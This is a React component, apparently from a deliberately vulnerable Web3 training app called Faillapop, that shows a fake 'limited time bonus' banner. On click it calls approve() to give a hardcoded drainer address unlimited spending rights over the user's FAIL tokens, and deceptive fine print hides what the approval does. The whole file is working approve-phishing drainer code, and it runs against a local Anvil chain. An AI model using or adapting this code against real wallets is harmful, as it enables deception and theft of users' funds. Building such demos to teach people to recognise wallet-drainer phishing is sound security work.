import React, { useState } from 'react';
import { ethers } from 'ethers';
import { ContractService } from '../services/ContractService';
import { FAILLAPOP_TOKEN_ADDRESS, FAILLAPOP_TOKEN_ABI } from '../contracts/config';

interface MaliciousApproveButtonProps {
  contractService: ContractService;
  userAddress: string;
}

// 🚨 VULNERABILIDAD: UI Spoofing + Approve Phishing
// Este componente simula un "bonus claim" pero en realidad ejecuta approvals maliciosos
export const MaliciousApproveButton: React.FC<MaliciousApproveButtonProps> = ({ 
  contractService, 
  userAddress 
}) => {
  const [isLoading, setIsLoading] = useState(false);
  const [showBonus, setShowBonus] = useState(true);

  // 🚨 DRAINER REAL: Usando la dirección del drainer real de Anvil
  const MALICIOUS_SPENDER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"; // Drainer real de Anvil

    const handleMaliciousApprove = async () => {
    if (!userAddress) return;

    try {
      setIsLoading(true);
      
      // 🚨 ATAQUE REAL: Ejecutar approval real de tokens
      if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum as any);
        const signer = provider.getSigner();
        
        // Obtener el contrato del token FAILLAPOP real
        const tokenContract = new ethers.Contract(FAILLAPOP_TOKEN_ADDRESS, FAILLAPOP_TOKEN_ABI.abi, signer);
        
        // Verificar el balance del usuario
        const userBalance = await tokenContract.balanceOf(userAddress);
        console.log("🚨 ATAQUE REAL DETECTADO:");
        console.log("Token contract:", FAILLAPOP_TOKEN_ADDRESS);
        console.log("User balance:", ethers.utils.formatEther(userBalance), "FAIL tokens");
        console.log("Malicious spender (DRAINER):", MALICIOUS_SPENDER);
        console.log("🎯 DIRECCIONES ACTUALIZADAS - Anvil session activa");
        
        if (userBalance.gt(0)) {
          // ¡¡EJECUTAR APPROVE REAL!!
          // El usuario cree que está reclamando un bonus, pero en realidad está aprobando 
          // que el drainer pueda gastar TODOS sus tokens FAILLAPOP
          
          console.log("🚨 EJECUTANDO APPROVE REAL AL DRAINER...");
          
          // ✅ APPROVE REAL - ESTO REALMENTE SE EJECUTA
          const tx = await tokenContract.approve(MALICIOUS_SPENDER, ethers.constants.MaxUint256);
          console.log("📤 Approve transaction sent:", tx.hash);
          
          // Esperar confirmación del approve
          const receipt = await tx.wait();
          console.log("✅ Approve confirmado en bloque:", receipt.blockNumber);
          
          // Mostrar éxito del approve
          alert(
            `🚨 PHASE 1 COMPLETE - APPROVE SUCCESSFUL!\n\n` +
            `✅ Drainer now has UNLIMITED approval to spend your ${ethers.utils.formatEther(userBalance)} FAIL tokens!\n\n` +
            `📤 Transaction: ${tx.hash}\n` +
            `🏗️ Block: ${receipt.blockNumber}\n\n` +
            `💀 PHASE 2: Now go to the 'Token Drainer' section to execute the drain!\n\n` +
            `🚨 The drainer will now be able to steal all your tokens!`
          );
          
        } else {
          console.log("⚠️ Usuario no tiene tokens FAIL para aprobar");
          alert(
            "🎉 Bonus claimed!\n\n" +
            "Since you don't have FAIL tokens yet, this demonstrates how the attack would work if you did.\n\n" +
            "🚨 In a real scenario with tokens, they would now be approved for spending by the drainer!\n\n" +
            "Try minting some tokens first, then this attack will work for real."
          );
        }
        
        // Mostrar que el "bonus" fue "reclamado"
        setShowBonus(false);
        
      }
    } catch (error) {
      console.error("Error en ataque malicioso:", error);
      if ((error as any).message?.includes('user rejected')) {
        alert("❌ Transaction rejected by user. In a real phishing attack, the user would typically approve thinking they're claiming a bonus.");
      } else {
        alert("❌ Failed to execute attack. This could be due to network issues.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  if (!showBonus) {
    return (
      <div className="malicious-success">
        <p>✅ Bonus successfully claimed!</p>
        <small>Check your wallet for 100 FAIL tokens</small>
      </div>
    );
  }

  return (
    <div className="malicious-bonus-container">
      {/* 🚨 UI SPOOFING: Aparenta ser un bonus legítimo */}
      <div className="bonus-announcement">
        <h3>🎉 LIMITED TIME BONUS! 🎉</h3>
        <p>Claim your <strong>100 FREE FAIL tokens</strong> now!</p>
        <small>Only for active Faillapop users. Limited quantity available!</small>
      </div>
      
      <button
        onClick={handleMaliciousApprove}
        disabled={isLoading}
        className="malicious-claim-button"
      >
        {isLoading ? "Claiming..." : "🎁 CLAIM FREE TOKENS"}
      </button>
      
      {/* Texto engañoso que oculta la verdadera naturaleza */}
      <div className="fake-terms">
        <small>
          * By claiming, you authorize Faillapop to manage token transactions for rewards distribution
        </small>
      </div>
    </div>
  );
}; 